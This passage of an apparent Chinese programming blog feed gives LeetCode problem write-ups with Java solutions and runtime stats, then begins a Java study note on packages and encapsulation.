class="line">        list.sort((o1,o2) -&gt; Math.abs(o1) - Math.abs(o2));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> key : list)&#123;</span><br><span class="line">            <span class="comment">//判断是否有足够多的2*key</span></span><br><span class="line">            <span class="keyword">if</span>(map.get(key) &gt; map.getOrDefault(<span class="number">2</span>*key,<span class="number">0</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//维护2*key的数量，每次抵消key相同数量的2*key</span></span><br><span class="line">            map.put(<span class="number">2</span>*key , map.getOrDefault(<span class="number">2</span>*key,<span class="number">0</span>)-map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="744-寻找比目标字母大的最小字母"><a href="#744-寻找比目标字母大的最小字母" class="headerlink" title="744. 寻找比目标字母大的最小字母"></a><a href="https://leetcode-cn.com/problems/find-smallest-letter-greater-than-target/">744. 寻找比目标字母大的最小字母</a></h2><blockquote>
<p>给你一个排序后的字符列表 letters ，列表中只包含小写英文字母。另给出一个目标字母 target，请你寻找在这一有序列表里比目标字母大的最小字母。</p>
<p>在比较时，字母是依序循环出现的。举个例子：</p>
<p>如果目标字母 target &#x3D; ‘z’ 并且字符列表为 letters &#x3D; [‘a’, ‘b’]，则答案返回 ‘a’</p>
</blockquote>
<h3 id="思路：二分查找"><a href="#思路：二分查找" class="headerlink" title="思路：二分查找"></a>思路：二分查找</h3><p>和之前做的二分查找一样，只不过对象换成了字符而已</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">nextGreatestLetter</span><span class="params">(<span class="type">char</span>[] letters, <span class="type">char</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> , right = letters.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> letters.length;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right)&gt;&gt; <span class="number">1</span> ;</span><br><span class="line">            <span class="type">char</span> <span class="variable">char1</span> <span class="operator">=</span> letters[mid];</span><br><span class="line">            <span class="keyword">if</span>((char1 - target)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                right = mid -<span class="number">1</span> ;</span><br><span class="line">                ans = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans == letters.length ? letters[<span class="number">0</span>] : letters[ans];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="796-旋转字符串"><a href="#796-旋转字符串" class="headerlink" title="796. 旋转字符串"></a><a href="https://leetcode-cn.com/problems/rotate-string/">796. 旋转字符串</a></h2><blockquote>
<p>给定两个字符串, s 和 goal。如果在若干次旋转操作之后，s 能变成 goal ，那么返回 true 。</p>
<p>s 的 旋转操作 就是将 s 最左边的字符移动到最右边。 </p>
<p>例如, 若 s &#x3D; ‘abcde’，在旋转一次之后结果就是’bcdea’ 。</p>
</blockquote>
<h3 id="思路：模拟-拼接"><a href="#思路：模拟-拼接" class="headerlink" title="思路：模拟+拼接"></a>思路：模拟+拼接</h3><p>当时做题的时候想的是直接模拟，但是后来发现用拼接的方法简单、粗暴又迅速，一行代码就可以解决~瞬间觉得智商低下&#x3D; &#x3D;</p>
<p>由于每次旋转操作都是将最左侧字符移动到最右侧，因此如果 goal 可由 s 经过多步旋转而来，<strong>那么 goal 必然会出现在 s + s 中</strong>，即满足 (s + s).contains(goal)，同时为了 s 本身过长导致的结果成立，我们需要先确保两字符串长度相等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">rotateString</span><span class="params">(String s, String goal)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s.length()==goal.length()&amp;&amp;(s+s).contains(goal);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="357-统计各位数字都不同的数字个数"><a href="#357-统计各位数字都不同的数字个数" class="headerlink" title="357. 统计各位数字都不同的数字个数"></a><a href="https://leetcode-cn.com/problems/count-numbers-with-unique-digits/">357. 统计各位数字都不同的数字个数</a></h2><blockquote>
<p>给你一个整数 <code>n</code> ，统计并返回各位数字都不同的数字 <code>x</code> 的个数，其中 <code>0 &lt;= x &lt; 10n</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：91</span><br><span class="line">解释：答案应为除去 11、22、33、44、55、66、77、88、99 外，在 0 ≤ x &lt; 100 范围内的所有数字。 </span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路1：暴力遍历-哈希"><a href="#思路1：暴力遍历-哈希" class="headerlink" title="思路1：暴力遍历+哈希"></a>思路1：暴力遍历+哈希</h3><p>最开始的思路是两层for循环，一层遍历所有数，一层来判断当前数是否含有重复数字，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNumbersWithUniqueDigits</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        tab: <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt; Math.pow(<span class="number">10</span>,n);i++)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> String.valueOf(i);</span><br><span class="line">            Map&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Character,Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j &lt; temp.length();j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(temp.charAt(j)))&#123;</span><br><span class="line">                    <span class="keyword">continue</span> tab;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    map.put(temp.charAt(j),j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            number++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后得出的结果，逻辑没问题，但时间超出了限制。。。在意料之中</p>
<h2 id="正确思路：乘法原理"><a href="#正确思路：乘法原理" class="headerlink" title="正确思路：乘法原理"></a>正确思路：乘法原理</h2><p>对于 n &#x3D; 0的情况较为特殊，特判一下，返回 1。</p>
<p>对于其他情况，由于不能含有前导 0，最高位可选择的数值个数为 9，而从次高位开始到最低位，可选的个数从 9 开始逐一递减。</p>
<p>利用乘法原理，每位数可选的数值个数相乘即是长度为 n 的数的可能方案数 cur，而所有长度[1,n]的方案数累加即是答案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int countNumbersWithUniqueDigits(int n) &#123;</span><br><span class="line">        if(n==0) return 1;</span><br><span class="line">        int ans = 10;</span><br><span class="line">        for(int i = 2 , last = 9 ; i &lt;= n ;i++)&#123;</span><br><span class="line">            int cur = last*(10-i+1);</span><br><span class="line">            ans += cur;</span><br><span class="line">            last = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户</li>
<li>内存消耗：38.1 MB, 在所有 Java 提交中击败了51.14%的用户</li>
<li>通过测试用例：9 &#x2F; 9</li>
</ul>
<p>这个题发现：刷题不是简单的模拟，还要找规律，看下能否用上数学思想&#x3D; &#x3D;</p>
<h2 id="806-写字符串需要的行数"><a href="#806-写字符串需要的行数" class="headerlink" title="806. 写字符串需要的行数"></a><a href="https://leetcode-cn.com/problems/number-of-lines-to-write-string/">806. 写字符串需要的行数</a></h2><blockquote>
<p>我们要把给定的字符串 S 从左到右写到每一行上，每一行的最大宽度为100个单位，如果我们在写某个字母的时候会使这行超过了100 个单位，那么我们应该把这个字母写到下一行。我们给定了一个数组 widths ，这个数组 widths[0] 代表 ‘a’ 需要的单位， widths[1] 代表 ‘b’ 需要的单位，…， widths[25] 代表 ‘z’ 需要的单位。</p>
<p>现在回答两个问题：至少多少行能放下S，以及最后一行使用的宽度是多少个单位？将你的答案作为长度为2的整数列表返回。</p>
<p>示例 1:<br>输入:<br>widths &#x3D; [10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10]<br>S &#x3D; “abcdefghijklmnopqrstuvwxyz”<br>输出: [3, 60]<br>解释:<br>所有的字符拥有相同的占用单位10。所以书写所有的26个字母，<br>我们需要2个整行和占用60个单位的一行。</p>
</blockquote>
<h3 id="思路1：哈希表"><a href="#思路1：哈希表" class="headerlink" title="思路1：哈希表"></a>思路1：哈希表</h3><p>首先将26个字母的单位存入哈希表中，然后遍历读取字符串的时候从哈希表中get</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] numberOfLines(<span class="type">int</span>[] widths, String s) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> <span class="number">1</span> , column = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        Map&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Character,Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt; <span class="number">26</span> ; i++)&#123;</span><br><span class="line">           </span><br><span class="line">            map.put((<span class="type">char</span>)(<span class="string">&#x27;a&#x27;</span>+i),widths[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j &lt; len;j++)&#123;</span><br><span class="line">            sum += map.get(s.charAt(j));</span><br><span class="line">            <span class="keyword">while</span>(sum &gt; <span class="number">100</span>)&#123;</span><br><span class="line">                sum = map.get(s.charAt(j));</span><br><span class="line">                row++;</span><br><span class="line">            &#125;</span><br><span class="line">            column = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;row,column&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：1 ms, 在所有 Java 提交中击败了19.23%的用户</li>
<li>内存消耗：39.7 MB, 在所有 Java 提交中击败了22.88%的用户</li>
<li>通过测试用例：27 &#x2F; 27</li>
</ul>
<p>时间复杂度有点高</p>
<h3 id="思路2：直接模拟"><a href="#思路2：直接模拟" class="headerlink" title="思路2：直接模拟"></a>思路2：直接模拟</h3><p>似乎之前的想法太复杂了&#x3D; &#x3D; 。根本没必要用到哈希表，直接用数组即可表示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] numberOfLines(<span class="type">int</span>[] widths, String s) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lines</span> <span class="operator">=</span> <span class="number">1</span> , width =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;s.length(); i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> widths[s.charAt(i)-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            width += sum;</span><br><span class="line">            <span class="keyword">if</span>(width &gt; <span class="number">100</span>)&#123;</span><br><span class="line">                lines++;</span><br><span class="line">                width = sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;lines,width&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户，<strong>O(n)</strong></li>
<li>内存消耗：39.4 MB, 在所有 Java 提交中击败了55.26%的用户，<strong>O(1)</strong></li>
<li>通过测试用例：27 &#x2F; 27</li>
</ul>
<h2 id="386-字典序排数"><a href="#386-字典序排数" class="headerlink" title="386. 字典序排数"></a><a href="https://leetcode-cn.com/problems/lexicographical-numbers/">386. 字典序排数</a></h2><blockquote>
<p>给你一个整数 <code>n</code> ，按字典序返回范围 <code>[1, n]</code> 内所有整数。</p>
<p>你必须设计一个时间复杂度为 <code>O(n)</code> 且使用 <code>O(1)</code> 额外空间的算法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 13</span><br><span class="line">输出：[1,10,11,12,13,2,3,4,5,6,7,8,9]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路1：深度优先搜索"><a href="#思路1：深度优先搜索" class="headerlink" title="思路1：深度优先搜索"></a>思路1：深度优先搜索</h3><p>对于一个整数curr，它的下一个字典序整数对应下面的规则：</p>
<ul>
<li>尝试在curr后面附加一个零，即curr x 10，如果curr x 10 &lt; n，那么说明curr x 10是下一个字典序	整数；</li>
<li>如果curr % 10 &#x3D;&#x3D; 9 || curr &#x3D;&#x3D; n，那么说明末尾的数位已经搜索完成，退回上一位，然后继续判断直到curr % 10 &#x3D;&#x3D; 9 || curr &#x3D;&#x3D; n为止，那么curr+1是下一个字典序整数。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">lexicalOrder</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ,curr = <span class="number">1</span>; i&lt; n;i++)&#123;</span><br><span class="line">            ans.add(curr);</span><br><span class="line">            <span class="keyword">if</span>(curr*<span class="number">10</span> &lt;= n)&#123;</span><br><span class="line">                curr *= <span class="number">10</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(curr % <span class="number">10</span> == <span class="number">9</span> || curr == n)&#123;</span><br><span class="line">                    curr /= <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                curr++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="883-三维形体投影面积"><a href="#883-三维形体投影面积" class="headerlink" title="883. 三维形体投影面积"></a><a href="https://leetcode-cn.com/problems/projection-area-of-3d-shapes/">883. 三维形体投影面积</a></h2><blockquote>
<p>在 n x n 的网格 grid 中，我们放置了一些与 x，y，z 三轴对齐的 1 x 1 x 1 立方体。</p>
<p>每个值 v &#x3D; grid[i][j] 表示 v 个正方体叠放在单元格 (i, j) 上。</p>
<p>现在，我们查看这些立方体在 xy 、yz 和 zx 平面上的投影。</p>
<p>投影 就像影子，将 三维 形体映射到一个 二维 平面上。从顶部、前面和侧面看立方体时，我们会看到“影子”。</p>
<p>返回 所有三个投影的总面积 。</p>
</blockquote>
<h3 id="思路：直接模拟-1"><a href="#思路：直接模拟-1" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h3><p>根据题意，\texttt{x}x 轴对应行，\texttt{y}y 轴对应列，\texttt{z}z 轴对应网格的数值。</p>
<p>因此：</p>
<ul>
<li><p>xy 平面的投影面积等于网格上非零数值的数目；</p>
</li>
<li><p>yz 平面的投影面积等于网格上每一列最大数值之和；</p>
</li>
<li><p>zx 平面的投影面积等于网格上每一行最大数值之和。</p>
</li>
</ul>
<p>返回上述三个投影面积之和。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">projectionArea</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans1</span> <span class="operator">=</span> <span class="number">0</span>,ans2 = <span class="number">0</span>,ans3 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span> , b = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span> ; j &lt; n ;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]&gt;<span class="number">0</span>)</span><br><span class="line">                    ans1++;</span><br><span class="line">                a = Math.max(a,grid[i][j]);</span><br><span class="line">                b = Math.max(b,grid[j][i]);</span><br><span class="line">            &#125;</span><br><span class="line">        ans2 += a;</span><br><span class="line">        ans3 += b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans1+ans2+ans3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：2 ms, 在所有 Java 提交中击败了69.63%的用户,O(n2)</li>
<li>内存消耗：41.2 MB, 在所有 Java 提交中击败了36.20%的用户,O(1)</li>
<li>通过测试用例：90 &#x2F; 90</li>
</ul>
<h2 id="905-按奇偶排序数组"><a href="#905-按奇偶排序数组" class="headerlink" title="905. 按奇偶排序数组"></a><a href="https://leetcode-cn.com/problems/sort-array-by-parity/">905. 按奇偶排序数组</a></h2><h3 id="思路1：直接模拟"><a href="#思路1：直接模拟" class="headerlink" title="思路1：直接模拟"></a>思路1：直接模拟</h3><p>定义两个指针，一个left，一个right，创建一个相同大小数组，遍历nums的每一个值，如果为偶数则赋给新数组的左边，如果为奇数则赋给新数组的右边。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArrayByParity(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span> , b = len-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; len ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                ans[a] = nums[i];</span><br><span class="line">                a += <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans[b] = nums[i];</span><br><span class="line">                b -= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户，O（n）</li>
<li>内存消耗：42.5 MB, 在所有 Java 提交中击败了9.86%的用户，O（1）</li>
<li>通过测试用例：285 &#x2F; 285</li>
</ul>
<h3 id="思路2：简化，直接交换"><a href="#思路2：简化，直接交换" class="headerlink" title="思路2：简化，直接交换"></a>思路2：简化，直接交换</h3><p>使用指针 ii和 j 分别代表未处理区间的左右端点，当 nums[i] 不为偶数时，将 i 和 j 两个位置互换，原有位置 j 边是奇数（已处理好），让 j 自减左移，但原有位置 i 交换后不确保是偶数，需要再次检查。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArrayByParity(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> , j = n-<span class="number">1</span>; i&lt;j ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] % <span class="number">2</span> ==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[j];</span><br><span class="line">                nums[j--] = nums[i];</span><br><span class="line">                nums[i--] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户，O（n）</li>
<li>内存消耗：42.4 MB, 在所有 Java 提交中击败了27.43%的用户，O（1）</li>
<li>通过测试用例：285 &#x2F; 285</li>
</ul>
<p>实际上一个数组空间的提升，似乎很小~</p>
<h2 id="908-最小差值-I"><a href="#908-最小差值-I" class="headerlink" title="908. 最小差值 I"></a><a href="https://leetcode-cn.com/problems/smallest-range-i/">908. 最小差值 I</a></h2><blockquote>
<p>给你一个整数数组 nums，和一个整数 k 。</p>
<p>在一个操作中，您可以选择 0 &lt;&#x3D; i &lt; nums.length 的任何索引 i 。将 nums[i] 改为 nums[i] + x ，其中 x 是一个范围为 [-k, k] 的整数。对于每个索引 i ，最多 只能 应用 一次 此操作。</p>
<p>nums 的 分数 是 nums 中最大和最小元素的差值。 </p>
<p>在对  nums 中的每个索引最多应用一次上述操作后，返回 nums 的最低 分数 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1], k = 0</span><br><span class="line">输出：0</span><br><span class="line">解释：分数是 max(nums) - min(nums) = 1 - 1 = 0。</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：数学"><a href="#思路：数学" class="headerlink" title="思路：数学"></a>思路：数学</h3><p>假设数组的最大值为maxVlue，最小值为minValue，则以下两种情况即可涵盖所有情景：</p>
<ul>
<li>maxValue - minValue &lt;&#x3D; 2*k，那么我们总可以将整数数组 nums 的所有元素都改为同一个整数，因此更改后的整数数组 nums 的最低分数为 0。</li>
<li>maxValue - minValue &gt; 2<em>k，那么更改后的整数数组 nums 的最低分数为maxValue - minValue - 2</em>k  。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">smallestRangeI</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minValue</span> <span class="operator">=</span> Arrays.stream(nums).min().getAsInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> Arrays.stream(nums).max().getAsInt();</span><br><span class="line">        <span class="keyword">return</span> maxValue-minValue &lt;= <span class="number">2</span>*k?<span class="number">0</span>:maxValue-minValue-<span class="number">2</span>*k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(四)——包及封装</title>
    <url>/2022/04/18/14-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)%E2%80%94%E2%80%94%E5%8C%85%E5%8F%8A%E5%B0%81%E8%A3%85%20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该部分为面向对象编程（中级部分）</p>
<h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>本质：创建不同的文件夹来保存类文件</p>
<h3 id="三大作用"><a href="#三大作用" class="headerlink" title="三大作用"></a>三大作用</h3><ul>
<li>1、区分相同名字的类</li>
<li>2、当类很多时，可以很好的管理类</li>
<li>3、控制访问范围</li>
</ul>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hspedu;</span><br></pre></td></tr></table></figure>

<ul>
<li>1、package 关键字，表示打包</li>
<li>2、com.hspedu 表示包名</li>
</ul>
<h3 id="包的命名"><a href="#包的命名" class="headerlink" title="包的命名"></a>包的命名</h3><p>规则：只能包含数字、字母、下划线、小圆点。但不能用数字开头，不能是关键字或保留字</p>
<p>规范：</p>
<ul>
<li>一般是小写字母+小圆点</li>
<li>com.公司名.项目名.业务模块名</li>
</ul>
<h3 id="常用的包"><a href="#常用的包" class="headerlink" title="常用的包"></a>常用的包</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.*		<span class="comment">//lang是基本包，默认引入，不需要再引入</span></span><br><span class="line">java.util.*		<span class="comment">//util包，系统提供的工具包，工具类，使用Scanner</span></span><br><span class="line">java.net.*		<span class="comment">//网络包，网络开发</span></span><br><span class="line">java.awt.*		<span class="comment">//java界面开发，GUI</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><h2 id="封装介绍"><a href="#封装介绍" class="headerlink" title="封装介绍"></a>封装介绍</h2><p>封装（encapsulation）就是把抽象出的数据【属性】和对数据的操作【方法】封装在一起，数据被保护在内部，程序的其他部分只能通过被授权的操作【方法】，才能对数据进行操作</p>
<h2 id="封装的理解和好处"><a href="#封装的理解和好处" class="headerlink" title="封装的理解和好处"></a>封装的理解和好处</h2><ul>
<li>隐藏实现细节</li>
<li>可以对数据进行验证，保证安全合理</li>
</ul>
<h2 id="封装的实现步骤"><a href="#封装的实现步骤" class="headerlink" title="封装的实现步骤"></a>封装的实现步骤</h2><ul>
<li>1、将属性进行私有化private（不能直接修改属性）</li>
<li>2、提供一个公共的（public）set方法，用于对属性进行判断并赋值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void setXxx（类型 参数名）&#123;</span><br><span class="line">	//Xxx表示某个属性</span><br><span class="line">	//加入数据验证的业务逻辑</span><br><span class="line">	属性=参数名;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3、提供一个公共的get方法，用于获取属性的值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public 数据类型 getXxx()&#123;</span><br><span class="line">//权限判断</span><br><span class="line">return xx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.encap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Period;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">encapsulation01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        person.setName(<span class="string">&quot;张严&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">30</span>);</span><br><span class="line">        person.setSalary(<span class="number">10000.00</span>);</span><br><span class="line">        System.out.println(person.info());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span 